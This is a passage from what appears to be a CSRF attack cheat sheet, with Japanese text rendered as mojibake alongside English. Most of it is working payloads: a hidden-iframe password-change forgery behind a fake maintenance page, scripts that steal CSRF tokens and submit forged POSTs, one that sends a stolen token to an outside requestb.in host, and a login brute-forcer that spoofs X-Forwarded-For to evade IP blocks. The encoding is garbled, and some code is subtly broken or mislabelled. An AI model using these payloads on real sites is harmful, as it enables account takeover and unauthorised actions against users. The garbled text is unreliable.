CSRF æ”»æ’ƒã«å¯¾æŠ—ã™ã‚‹ãŸã‚ã«ã€ã‚¦ã‚§ãƒ–é–‹ç™ºè€…ã¯ã€ã‚¢ãƒ³ãƒ-CSRF ãƒˆãƒ¼ã‚¯ãƒ³ã®ä½¿ç”¨ã€ãƒªãƒ•ã‚¡ãƒ©ãƒ¼ãƒ˜ãƒƒãƒ€ãƒ¼ã®æ¤œè¨¼ã€å³æ ¼ãªã‚¢ã‚¯ã‚»ã‚¹åˆ¶å¾¡ã®å®Ÿè£…ãªã©ã®å¯¾ç­–ã‚’å®Ÿæ–½ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚
```markup
<--! expl.html -->

<body onload="envia()">
<form method="POST"id="formulario" action="http://aplicacion.example.com/cambia_pwd.php">
<input type="text" id="pwd" name="pwd" value="otra nueva">
</form>
<body>
<script>
function envia(){document.getElementById("formulario").submit();}
</script>

<!-- public.html -->
<iframe src="2-1.html" style="position:absolute;top:-5000">
</iframe>
<h1>Sitio bajo mantenimiento. Disculpe las molestias</h1>
```
### **CSRFãƒˆãƒ¼ã‚¯ãƒ³ã‚’ç›—ã¿ã€POSTãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’é€ä¿¡ã™ã‚‹**

To perform a CSRF attack, you need to steal the CSRF token from the target website and then use it to craft a malicious POST request. Here's how you can do it:

1. **Stealing the CSRF Token**: The CSRF token is typically embedded in the HTML of the target website. You can use various techniques like cross-site scripting (XSS) or social engineering to trick the victim into executing a script that extracts the CSRF token. Once you have the token, store it for later use.

2. **Crafting the Malicious POST Request**: With the stolen CSRF token, you can now craft a POST request to perform the desired action on the target website. Make sure to include all the necessary parameters and values required by the target website's form. The CSRF token should be included as a parameter in the request body or as a custom header, depending on how the website handles CSRF protection.

3. **Sending the POST Request**: Once you have crafted the malicious POST request, you can send it to the target website. This can be done using various tools like cURL, Python requests library, or browser extensions like Postman. Make sure to set the appropriate headers and cookies to mimic a legitimate request.

By stealing the CSRF token and sending a crafted POST request, you can trick the target website into performing actions on behalf of the victim without their consent. This can lead to various security vulnerabilities, such as unauthorized data modification or account takeover. It is important for website developers to implement proper CSRF protection mechanisms to mitigate such attacks.
```javascript
function submitFormWithTokenJS(token) {
var xhr = new XMLHttpRequest();
xhr.open("POST", POST_URL, true);
xhr.withCredentials = true;

// Send the proper header information along with the request
xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");

// This is for debugging and can be removed
xhr.onreadystatechange = function() {
if(xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
//console.log(xhr.responseText);
}
}

xhr.send("token=" + token + "&otherparama=heyyyy");
}

function getTokenJS() {
var xhr = new XMLHttpRequest();
// This tels it to return it as a HTML document
xhr.responseType = "document";
xhr.withCredentials = true;
// true on the end of here makes the call asynchronous
xhr.open("GET", GET_URL, true);
xhr.onload = function (e) {
if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
// Get the document from the response
page = xhr.response
// Get the input element
input = page.getElementById("token");
// Show the token
//console.log("The token is: " + input.value);
// Use the token to submit the form
submitFormWithTokenJS(input.value);
}
};
// Make the request
xhr.send(null);
}

var GET_URL="http://google.com?param=VALUE"
var POST_URL="http://google.com?param=VALUE"
getTokenJS();
```
### **CSRFãƒˆãƒ¼ã‚¯ãƒ³ã‚’ç›—ã¿ã€iframeã€ãƒ•ã‚©ãƒ¼ãƒ ã€ãŠã‚ˆã³Ajaxã‚’ä½¿ç”¨ã—ã¦POSTãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’é€ä¿¡ã™ã‚‹**

CSRFï¼ˆCross-Site Request Forgeryï¼‰æ”»æ’ƒã¯ã€æ”»æ’ƒè€…ãŒè¢«å®³è€…ã®ä»£ã‚ã‚Šã«æ„å›³ã—ãªã„ãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’é€ä¿¡ã™ã‚‹æ”»æ’ƒæ‰‹æ³•ã§ã™ã€‚ã“ã®æ”»æ’ƒã‚’è¡Œã†ãŸã‚ã«ã¯ã€è¢«å®³è€…ã®ã‚»ãƒƒã‚·ãƒ§ãƒ³ã«é–¢é€£ä»˜ã‘ã‚‰ã‚ŒãŸCSRFãƒˆãƒ¼ã‚¯ãƒ³ã‚’ç›—ã‚€å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚

ä»¥ä¸‹ã®æ‰‹é †ã‚’ä½¿ç”¨ã—ã¦ã€CSRFãƒˆãƒ¼ã‚¯ãƒ³ã‚’ç›—ã¿ã€ãã‚Œã‚’ä½¿ç”¨ã—ã¦POSTãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’é€ä¿¡ã™ã‚‹æ–¹æ³•ã‚’èª¬æ˜ã—ã¾ã™ã€‚

1. æ”»æ’ƒè€…ã¯ã€æ‚ªæ„ã®ã‚ã‚‹ã‚¦ã‚§ãƒ–ã‚µã‚¤ãƒˆã«iframeã‚’åŸ‹ã‚è¾¼ã¿ã¾ã™ã€‚ã“ã®iframeã¯ã€è¢«å®³è€…ã®ãƒ–ãƒ©ã‚¦ã‚¶ã§è‡ªå‹•çš„ã«èª­ã¿è¾¼ã¾ã‚Œã¾ã™ã€‚

```html
<iframe src="http://attacker.com/csrf" style="display:none;"></iframe>
```

2. æ”»æ’ƒè€…ã®ã‚¦ã‚§ãƒ–ã‚µã‚¤ãƒˆï¼ˆhttp://attacker.com/csrfï¼‰ã§ã¯ã€è¢«å®³è€…ã®ãƒ–ãƒ©ã‚¦ã‚¶ã§å®Ÿè¡Œã•ã‚Œã‚‹JavaScriptã‚’ç”¨æ„ã—ã¾ã™ã€‚ã“ã®JavaScriptã¯ã€è¢«å®³è€…ã®ã‚»ãƒƒã‚·ãƒ§ãƒ³ã‹ã‚‰CSRFãƒˆãƒ¼ã‚¯ãƒ³ã‚’ç›—ã¿ã¾ã™ã€‚

```html
<script>
    var token = document.getElementsByName('csrf_token')[0].value;
    var xhr = new XMLHttpRequest();
    xhr.open('POST', 'http://victim.com/profile', true);
    xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
    xhr.send('name=Attacker&csrf_token=' + token);
</script>
```

3. æ”»æ’ƒè€…ã¯ã€è¢«å®³è€…ã«ãƒªãƒ³ã‚¯ã‚„ãƒ¡ãƒ¼ãƒ«ãªã©ã‚’é€ã‚Šã€è¢«å®³è€…ãŒæ”»æ’ƒè€…ã®ã‚¦ã‚§ãƒ–ã‚µã‚¤ãƒˆã‚’è¨ªã‚Œã‚‹ã‚ˆã†èª˜å°ã—ã¾ã™ã€‚

4. è¢«å®³è€…ãŒæ”»æ’ƒè€…ã®ã‚¦ã‚§ãƒ–ã‚µã‚¤ãƒˆã‚’è¨ªã‚Œã‚‹ã¨ã€iframeãŒèª­ã¿è¾¼ã¾ã‚Œã€JavaScriptãŒå®Ÿè¡Œã•ã‚Œã¾ã™ã€‚ã“ã‚Œã«ã‚ˆã‚Šã€è¢«å®³è€…ã®ã‚»ãƒƒã‚·ãƒ§ãƒ³ã‹ã‚‰CSRFãƒˆãƒ¼ã‚¯ãƒ³ãŒç›—ã¾ã‚Œã€æ”»æ’ƒè€…ã®ã‚¦ã‚§ãƒ–ã‚µã‚¤ãƒˆã‹ã‚‰POSTãƒªã‚¯ã‚¨ã‚¹ãƒˆãŒé€ä¿¡ã•ã‚Œã¾ã™ã€‚

ä»¥ä¸Šã®æ‰‹æ³•ã‚’ä½¿ç”¨ã™ã‚‹ã“ã¨ã§ã€æ”»æ’ƒè€…ã¯è¢«å®³è€…ã®ã‚»ãƒƒã‚·ãƒ§ãƒ³ã‚’ä¹—ã£å–ã‚Šã€æ„å›³ã—ãªã„ãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’é€ä¿¡ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚è¢«å®³è€…ã¯ã€ä¿¡é ¼ã§ãã‚‹ã‚¦ã‚§ãƒ–ã‚µã‚¤ãƒˆã«ãƒ­ã‚°ã‚¤ãƒ³ã—ã¦ã„ã‚‹å ´åˆã§ã‚‚ã€ã“ã®æ”»æ’ƒã«å¯¾ã—ã¦è„†å¼±ã§ã™ã€‚
```markup
<form id="form1" action="http://google.com?param=VALUE" method="post" enctype="multipart/form-data">
<input type="text" name="username" value="AA">
<input type="checkbox" name="status" checked="checked">
<input id="token" type="hidden" name="token" value="" />
</form>

<script type="text/javascript">
function f1(){
x1=document.getElementById("i1");
x1d=(x1.contentWindow||x1.contentDocument);
t=x1d.document.getElementById("token").value;

document.getElementById("token").value=t;
document.getElementById("form1").submit();
}
</script>
<iframe id="i1" style="display:none" src="http://google.com?param=VALUE" onload="javascript:f1();"></iframe>
```
### **CSRFãƒˆãƒ¼ã‚¯ãƒ³ã‚’ç›—ã¿ã€iframeã¨ãƒ•ã‚©ãƒ¼ãƒ ã‚’ä½¿ç”¨ã—ã¦POSTãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’é€ä¿¡ã™ã‚‹**

CSRFï¼ˆCross-Site Request Forgeryï¼‰æ”»æ’ƒã¯ã€æ”»æ’ƒè€…ãŒè¢«å®³è€…ã®ä»£ã‚ã‚Šã«æ„å›³ã—ãªã„ãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’é€ä¿¡ã™ã‚‹æ”»æ’ƒæ‰‹æ³•ã§ã™ã€‚ã“ã®æ”»æ’ƒã‚’è¡Œã†ãŸã‚ã«ã¯ã€è¢«å®³è€…ã®ã‚»ãƒƒã‚·ãƒ§ãƒ³ã«é–¢é€£ä»˜ã‘ã‚‰ã‚ŒãŸCSRFãƒˆãƒ¼ã‚¯ãƒ³ã‚’ç›—ã‚€å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚

ä»¥ä¸‹ã®æ‰‹é †ã§CSRFãƒˆãƒ¼ã‚¯ãƒ³ã‚’ç›—ã¿ã€iframeã¨ãƒ•ã‚©ãƒ¼ãƒ ã‚’ä½¿ç”¨ã—ã¦POSTãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’é€ä¿¡ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

1. æ”»æ’ƒè€…ã¯ã€æ‚ªæ„ã®ã‚ã‚‹ã‚¦ã‚§ãƒ–ã‚µã‚¤ãƒˆã‚’ä½œæˆã—ã¾ã™ã€‚ã“ã®ã‚¦ã‚§ãƒ–ã‚µã‚¤ãƒˆã«ã¯ã€æ”»æ’ƒè€…ãŒåˆ¶å¾¡ã™ã‚‹ã‚µãƒ¼ãƒãƒ¼ã«POSTãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’é€ä¿¡ã™ã‚‹ãŸã‚ã®ãƒ•ã‚©ãƒ¼ãƒ ãŒå«ã¾ã‚Œã¦ã„ã¾ã™ã€‚

2. æ”»æ’ƒè€…ã¯ã€è¢«å®³è€…ã‚’èª˜å°ã—ã¦æ‚ªæ„ã®ã‚ã‚‹ã‚¦ã‚§ãƒ–ã‚µã‚¤ãƒˆã‚’è¨ªã‚Œã•ã›ã¾ã™ã€‚è¢«å®³è€…ãŒã“ã®ã‚¦ã‚§ãƒ–ã‚µã‚¤ãƒˆã‚’è¨ªã‚Œã‚‹ã¨ã€æ”»æ’ƒè€…ã®ã‚µãƒ¼ãƒãƒ¼ã«å¯¾ã—ã¦POSTãƒªã‚¯ã‚¨ã‚¹ãƒˆãŒé€ä¿¡ã•ã‚Œã¾ã™ã€‚

3. æ”»æ’ƒè€…ã®ã‚µãƒ¼ãƒãƒ¼ã¯ã€è¢«å®³è€…ã®ã‚»ãƒƒã‚·ãƒ§ãƒ³ã«é–¢é€£ä»˜ã‘ã‚‰ã‚ŒãŸCSRFãƒˆãƒ¼ã‚¯ãƒ³ã‚’ç›—ã¿ã¾ã™ã€‚ã“ã‚Œã«ã‚ˆã‚Šã€æ”»æ’ƒè€…ã¯è¢«å®³è€…ã®ã‚»ãƒƒã‚·ãƒ§ãƒ³ã‚’ãªã‚Šã™ã¾ã—ã€æ„å›³ã—ãªã„ãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’é€ä¿¡ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

4. æ”»æ’ƒè€…ã®ã‚µãƒ¼ãƒãƒ¼ã¯ã€ç›—ã‚“ã CSRFãƒˆãƒ¼ã‚¯ãƒ³ã‚’ä½¿ç”¨ã—ã¦ã€è¢«å®³è€…ã®ã‚»ãƒƒã‚·ãƒ§ãƒ³ã«å¯¾ã—ã¦æ„å›³ã—ãªã„POSTãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’é€ä¿¡ã—ã¾ã™ã€‚ã“ã‚Œã«ã‚ˆã‚Šã€æ”»æ’ƒè€…ã¯è¢«å®³è€…ã®ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã«ä¸æ­£ãªæ“ä½œã‚’è¡Œã†ã“ã¨ãŒã§ãã¾ã™ã€‚

ã“ã®æ”»æ’ƒæ‰‹æ³•ã‚’é˜²ããŸã‚ã«ã¯ã€ã‚¦ã‚§ãƒ–ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã¯CSRFãƒˆãƒ¼ã‚¯ãƒ³ã‚’ä½¿ç”¨ã—ã€ãƒªã‚¯ã‚¨ã‚¹ãƒˆã®æ­£å½“æ€§ã‚’æ¤œè¨¼ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚ã¾ãŸã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ã«å¯¾ã—ã¦æ‚ªæ„ã®ã‚ã‚‹ã‚¦ã‚§ãƒ–ã‚µã‚¤ãƒˆã¸ã®ã‚¢ã‚¯ã‚»ã‚¹ã«æ³¨æ„ã™ã‚‹ã‚ˆã†ã«å•“ç™ºã™ã‚‹ã“ã¨ã‚‚é‡è¦ã§ã™ã€‚
```markup
<iframe id="iframe" src="http://google.com?param=VALUE" width="500" height="500" onload="read()"></iframe>

<script>
function read()
{
var name = 'admin2';
var token = document.getElementById("iframe").contentDocument.forms[0].token.value;
document.writeln('<form width="0" height="0" method="post" action="http://www.yoursebsite.com/check.php"  enctype="multipart/form-data">');
document.writeln('<input id="username" type="text" name="username" value="' + name + '" /><br />');
document.writeln('<input id="token" type="hidden" name="token" value="' + token + '" />');
document.writeln('<input type="submit" name="submit" value="Submit" /><br/>');
document.writeln('</form>');
document.forms[0].submit.click();
}
</script>
```
### **ãƒˆãƒ¼ã‚¯ãƒ³ã‚’ç›—ã¿ã€2ã¤ã®iframeã‚’ä½¿ç”¨ã—ã¦é€ä¿¡ã™ã‚‹**

In this technique, we will exploit a Cross-Site Request Forgery (CSRF) vulnerability to steal a user's token and send it to an attacker-controlled server using two iframes.

ã“ã®æŠ€è¡“ã§ã¯ã€Cross-Site Request Forgeryï¼ˆCSRFï¼‰ã®è„†å¼±æ€§ã‚’æ‚ªç”¨ã—ã¦ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®ãƒˆãƒ¼ã‚¯ãƒ³ã‚’ç›—ã¿ã€2ã¤ã®iframeã‚’ä½¿ç”¨ã—ã¦æ”»æ’ƒè€…ãŒåˆ¶å¾¡ã™ã‚‹ã‚µãƒ¼ãƒãƒ¼ã«é€ä¿¡ã—ã¾ã™ã€‚

First, we need to identify a vulnerable website that is susceptible to CSRF attacks. Once we have found a target, we can proceed with the following steps:

ã¾ãšã€CSRFæ”»æ’ƒã®å½±éŸ¿ã‚’å—ã‘ã‚„ã™ã„è„†å¼±ãªã‚¦ã‚§ãƒ–ã‚µã‚¤ãƒˆã‚’ç‰¹å®šã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚ã‚¿ãƒ¼ã‚²ãƒƒãƒˆã‚’è¦‹ã¤ã‘ãŸã‚‰ã€ä»¥ä¸‹ã®æ‰‹é †ã‚’å®Ÿè¡Œã—ã¾ã™ã€‚

1. Create an HTML page that contains two iframes. The first iframe will load the target website, and the second iframe will load an attacker-controlled page.

   1. 2ã¤ã®iframeã‚’å«ã‚€HTMLãƒšãƒ¼ã‚¸ã‚’ä½œæˆã—ã¾ã™ã€‚æœ€åˆã®iframeã¯ã‚¿ãƒ¼ã‚²ãƒƒãƒˆã®ã‚¦ã‚§ãƒ–ã‚µã‚¤ãƒˆã‚’èª­ã¿è¾¼ã¿ã€2ç•ªç›®ã®iframeã¯æ”»æ’ƒè€…ãŒåˆ¶å¾¡ã™ã‚‹ãƒšãƒ¼ã‚¸ã‚’èª­ã¿è¾¼ã¿ã¾ã™ã€‚

2. In the attacker-controlled page loaded in the second iframe, include JavaScript code that will extract the user's token from the target website.

   2. 2ç•ªç›®ã®iframeã§èª­ã¿è¾¼ã¾ã‚Œã‚‹æ”»æ’ƒè€…ãŒåˆ¶å¾¡ã™ã‚‹ãƒšãƒ¼ã‚¸ã«ã€JavaScriptã‚³ãƒ¼ãƒ‰ã‚’å«ã‚ã¾ã™ã€‚ã“ã®ã‚³ãƒ¼ãƒ‰ã¯ã€ã‚¿ãƒ¼ã‚²ãƒƒãƒˆã®ã‚¦ã‚§ãƒ–ã‚µã‚¤ãƒˆã‹ã‚‰ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®ãƒˆãƒ¼ã‚¯ãƒ³ã‚’æŠ½å‡ºã—ã¾ã™ã€‚

3. Once the token is extracted, use JavaScript to send it to the attacker-controlled server using an HTTP request.

   3. ãƒˆãƒ¼ã‚¯ãƒ³ãŒæŠ½å‡ºã•ã‚ŒãŸã‚‰ã€JavaScriptã‚’ä½¿ç”¨ã—ã¦HTTPãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’ä»‹ã—ã¦ãã‚Œã‚’æ”»æ’ƒè€…ãŒåˆ¶å¾¡ã™ã‚‹ã‚µãƒ¼ãƒãƒ¼ã«é€ä¿¡ã—ã¾ã™ã€‚

4. The attacker-controlled server can then store the stolen tokens for further exploitation or perform actions on behalf of the user.

   4. æ”»æ’ƒè€…ãŒåˆ¶å¾¡ã™ã‚‹ã‚µãƒ¼ãƒãƒ¼ã¯ã€ç›—ã¾ã‚ŒãŸãƒˆãƒ¼ã‚¯ãƒ³ã‚’ã•ã‚‰ãªã‚‹æ‚ªç”¨ã®ãŸã‚ã«ä¿å­˜ã—ãŸã‚Šã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®ä»£ã‚ã‚Šã«ã‚¢ã‚¯ã‚·ãƒ§ãƒ³ã‚’å®Ÿè¡Œã—ãŸã‚Šã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

By using this technique, an attacker can trick a user into performing unintended actions on a vulnerable website, leading to potential data breaches or unauthorized operations.

ã“ã®æŠ€è¡“ã‚’ä½¿ç”¨ã™ã‚‹ã“ã¨ã§ã€æ”»æ’ƒè€…ã¯è„†å¼±ãªã‚¦ã‚§ãƒ–ã‚µã‚¤ãƒˆä¸Šã§æ„å›³ã—ãªã„ã‚¢ã‚¯ã‚·ãƒ§ãƒ³ã‚’å®Ÿè¡Œã•ã›ã‚‹ã“ã¨ãŒã§ãã€æ½œåœ¨çš„ãªãƒ‡ãƒ¼ã‚¿æ¼æ´©ã‚„ä¸æ­£ãªæ“ä½œãŒç™ºç”Ÿã™ã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚
```markup
<script>
var token;
function readframe1(){
token = frame1.document.getElementById("profile").token.value;
document.getElementById("bypass").token.value = token
loadframe2();
}
function loadframe2(){
var test = document.getElementbyId("frame2");
test.src = "http://requestb.in/1g6asbg1?token="+token;
}
</script>

<iframe id="frame1" name="frame1" src="http://google.com?param=VALUE" onload="readframe1()"
sandbox="allow-same-origin allow-scripts allow-forms allow-popups allow-top-navigation"
height="600" width="800"></iframe>

<iframe id="frame2" name="frame2"
sandbox="allow-same-origin allow-scripts allow-forms allow-popups allow-top-navigation"
height="600" width="800"></iframe>
<body onload="document.forms[0].submit()">
<form id="bypass" name"bypass" method="POST" target="frame2" action="http://google.com?param=VALUE" enctype="multipart/form-data">
<input type="text" name="username" value="z">
<input type="checkbox" name="status" checked="">
<input id="token" type="hidden" name="token" value="0000" />
<button type="submit">Submit</button>
</form>
```
### **Ajaxã‚’ä½¿ç”¨ã—ã¦CSRFãƒˆãƒ¼ã‚¯ãƒ³ã‚’ç›—ã¿ã€ãƒ•ã‚©ãƒ¼ãƒ ã§POSTãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’é€ä¿¡ã™ã‚‹**

To perform a Cross-Site Request Forgery (CSRF) attack, you can use Ajax to steal the CSRF token and then send a POST request using a form.

CSRF attacks exploit the trust that a website has in a user's browser. By tricking the browser into making a request on behalf of the user, an attacker can perform actions without the user's knowledge or consent.

Here's how you can steal the CSRF token using Ajax and send a POST request with a form:

1. Use Ajax to make a GET request to the target website's page that contains the CSRF token. This can be done using JavaScript's `XMLHttpRequest` or jQuery's `$.ajax` function.

2. Parse the response from the GET request to extract the CSRF token. This can be done by using regular expressions or by parsing the HTML response.

3. Create a new HTML form element dynamically using JavaScript. Set the `action` attribute of the form to the target URL where the POST request should be sent.

4. Add hidden input fields to the form, including the stolen CSRF token. These hidden fields should have the same names as the expected form fields on the target website.

5. Append the form to the document body.

6. Submit the form programmatically using JavaScript's `submit` method.

By following these steps, you can steal the CSRF token using Ajax and send a POST request with a form, effectively performing a CSRF attack. It is important to note that CSRF attacks can have serious consequences, so it is crucial to implement proper security measures to prevent them.
```markup
<body onload="getData()">

<form id="form" action="http://google.com?param=VALUE" method="POST" enctype="multipart/form-data">
<input type="hidden" name="username" value="root"/>
<input type="hidden" name="status" value="on"/>
<input type="hidden" id="findtoken" name="token" value=""/>
<input type="submit" value="valider"/>
</form>

<script>
var x = new XMLHttpRequest();
function getData() {
x.withCredentials = true;
x.open("GET","http://google.com?param=VALUE",true);
x.send(null);
}
x.onreadystatechange = function() {
if (x.readyState == XMLHttpRequest.DONE) {
var token = x.responseText.match(/name="token" value="(.+)"/)[1];
document.getElementById("findtoken").value = token;
document.getElementById("form").submit();
}
}
</script>
```
### Socket.IOã‚’ä½¿ç”¨ã—ãŸCSRF

Socket.IOã¯ã€Webã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã§ãƒªã‚¢ãƒ«ã‚¿ã‚¤ãƒ ãªåŒæ–¹å‘é€šä¿¡ã‚’å®Ÿç¾ã™ã‚‹ãŸã‚ã®JavaScriptãƒ©ã‚¤ãƒ–ãƒ©ãƒªã§ã™ã€‚Socket.IOã‚’ä½¿ç”¨ã—ã¦ãƒªã‚¢ãƒ«ã‚¿ã‚¤ãƒ ãªé€šä¿¡ã‚’è¡Œã†Webã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã¯ã€CSRFï¼ˆCross-Site Request Forgeryï¼‰æ”»æ’ƒã®æ½œåœ¨çš„ãªè„†å¼±æ€§ã«ã•ã‚‰ã•ã‚Œã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚

CSRFæ”»æ’ƒã¯ã€æ”»æ’ƒè€…ãŒè¢«å®³è€…ã®ä»£ã‚ã‚Šã«æ„å›³ã—ãªã„ãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’é€ä¿¡ã™ã‚‹ã“ã¨ã§ã€è¢«å®³è€…ã®ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã‚„ãƒ‡ãƒ¼ã‚¿ã‚’ä¹—ã£å–ã‚‹æ”»æ’ƒæ‰‹æ³•ã§ã™ã€‚Socket.IOã‚’ä½¿ç”¨ã™ã‚‹å ´åˆã€CSRFãƒˆãƒ¼ã‚¯ãƒ³ã‚’é©åˆ‡ã«å®Ÿè£…ã™ã‚‹ã“ã¨ãŒé‡è¦ã§ã™ã€‚

Socket.IOã§ã¯ã€CSRFãƒˆãƒ¼ã‚¯ãƒ³ã‚’ç”Ÿæˆã—ã€ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆã¨ã‚µãƒ¼ãƒãƒ¼é–“ã§ã‚„ã‚Šå–ã‚Šã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚ã“ã‚Œã«ã‚ˆã‚Šã€æ­£å½“ãªãƒªã‚¯ã‚¨ã‚¹ãƒˆã§ã‚ã‚‹ã“ã¨ã‚’ç¢ºèªã—ã€ä¸æ­£ãªãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’é˜²ãã“ã¨ãŒã§ãã¾ã™ã€‚

ä»¥ä¸‹ã¯ã€Socket.IOã‚’ä½¿ç”¨ã—ãŸCSRFæ”»æ’ƒã®ä¾‹ã§ã™ã€‚

```javascript
// ã‚µãƒ¼ãƒãƒ¼ã‚µã‚¤ãƒ‰ã®å®Ÿè£…
const io = require('socket.io')(server);
const csrf = require('csrf');

// CSRFãƒˆãƒ¼ã‚¯ãƒ³ã®ç”Ÿæˆ
const tokens = new csrf();

io.on('connection', (socket) => {
  // CSRFãƒˆãƒ¼ã‚¯ãƒ³ã®ç”Ÿæˆã¨ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆã¸ã®é€ä¿¡
  const token = tokens.create('csrf');
  socket.emit('csrfToken', token);

  // ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆã‹ã‚‰ã®ãƒªã‚¯ã‚¨ã‚¹ãƒˆã®å‡¦ç†
  socket.on('request', (data) => {
    // CSRFãƒˆãƒ¼ã‚¯ãƒ³ã®æ¤œè¨¼
    const isValid = tokens.verify('csrf', data.csrfToken);
    if (isValid) {
      // ãƒªã‚¯ã‚¨ã‚¹ãƒˆã®å‡¦ç†
      // ...
    } else {
      // CSRFæ”»æ’ƒã®æ¤œå‡º
      // ...
    }
  });
});
```

ä¸Šè¨˜ã®ä¾‹ã§ã¯ã€ã‚µãƒ¼ãƒãƒ¼ã‚µã‚¤ãƒ‰ã§Socket.IOã‚’ä½¿ç”¨ã—ã¦ã„ã¾ã™ã€‚ã‚µãƒ¼ãƒãƒ¼ã¯CSRFãƒˆãƒ¼ã‚¯ãƒ³ã‚’ç”Ÿæˆã—ã€ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆã«é€ä¿¡ã—ã¾ã™ã€‚ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆã¯ã€ãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’é€ä¿¡ã™ã‚‹éš›ã«CSRFãƒˆãƒ¼ã‚¯ãƒ³ã‚’å«ã‚ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚ã‚µãƒ¼ãƒãƒ¼ã¯ã€å—ã‘å–ã£ãŸCSRFãƒˆãƒ¼ã‚¯ãƒ³ã‚’æ¤œè¨¼ã—ã€æ­£å½“ãªãƒªã‚¯ã‚¨ã‚¹ãƒˆã‹ã©ã†ã‹ã‚’åˆ¤æ–­ã—ã¾ã™ã€‚

CSRFæ”»æ’ƒã‚’é˜²ããŸã‚ã«ã¯ã€Socket.IOã‚’ä½¿ç”¨ã™ã‚‹éš›ã«é©åˆ‡ãªCSRFãƒˆãƒ¼ã‚¯ãƒ³ã®å®Ÿè£…ãŒå¿…è¦ã§ã™ã€‚ã“ã‚Œã«ã‚ˆã‚Šã€ãƒªã‚¢ãƒ«ã‚¿ã‚¤ãƒ ãªé€šä¿¡ã‚’å®‰å…¨ã«è¡Œã†ã“ã¨ãŒã§ãã¾ã™ã€‚
```markup
<script src="https://cdn.jsdelivr.net/npm/socket.io-client@2/dist/socket.io.js"></script>
<script>
let socket = io('http://six.jh2i.com:50022/test');

const username = 'admin'

socket.on('connect', () => {
console.log('connected!');
socket.emit('join', {
room: username
});
socket.emit('my_room_event', {
data: '!flag',
room: username
})

});
</script>
```
## CSRFãƒ­ã‚°ã‚¤ãƒ³ãƒ–ãƒ«ãƒ¼ãƒˆãƒ•ã‚©ãƒ¼ã‚¹

ã“ã®ã‚³ãƒ¼ãƒ‰ã¯ã€CSRFãƒˆãƒ¼ã‚¯ãƒ³ã‚’ä½¿ç”¨ã—ã¦ãƒ­ã‚°ã‚¤ãƒ³ãƒ•ã‚©ãƒ¼ãƒ ã‚’ãƒ–ãƒ«ãƒ¼ãƒˆãƒ•ã‚©ãƒ¼ã‚¹æ”»æ’ƒã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ï¼ˆã¾ãŸã€å¯èƒ½ãªIPãƒ–ãƒ©ãƒƒã‚¯ãƒªã‚¹ãƒˆå›é¿ã®ãŸã‚ã«X-Forwarded-Forãƒ˜ãƒƒãƒ€ãƒ¼ã‚‚ä½¿ç”¨ã—ã¦ã„ã¾ã™ï¼‰ã€‚
```python
import request
import re
import random

URL = "http://10.10.10.191/admin/"
PROXY = { "http": "127.0.0.1:8080"}
SESSION_COOKIE_NAME = "BLUDIT-KEY"
USER = "fergus"
PASS_LIST="./words"

def init_session():
#Return CSRF + Session (cookie)
r = requests.get(URL)
csrf = re.search(r'input type="hidden" id="jstokenCSRF" name="tokenCSRF" value="([a-zA-Z0-9]*)"', r.text)
csrf = csrf.group(1)
session_cookie = r.cookies.get(SESSION_COOKIE_NAME)
return csrf, session_cookie

def login(user, password):
print(f"{user}:{password}")
csrf, cookie = init_session()
cookies = {SESSION_COOKIE_NAME: cookie}
data = {
"tokenCSRF": csrf,
"username": user,
"password": password,
"save": ""
}
headers = {
"X-Forwarded-For": f"{random.randint(1,256)}.{random.randint(1,256)}.{random.randint(1,256)}.{random.randint(1,256)}"
}
r = requests.post(URL, data=data, cookies=cookies, headers=headers, proxies=PROXY)
if "Username or password incorrect" in r.text:
return False
else:
print(f"FOUND {user} : {password}")
return True

with open(PASS_LIST, "r") as f:
for line in f:
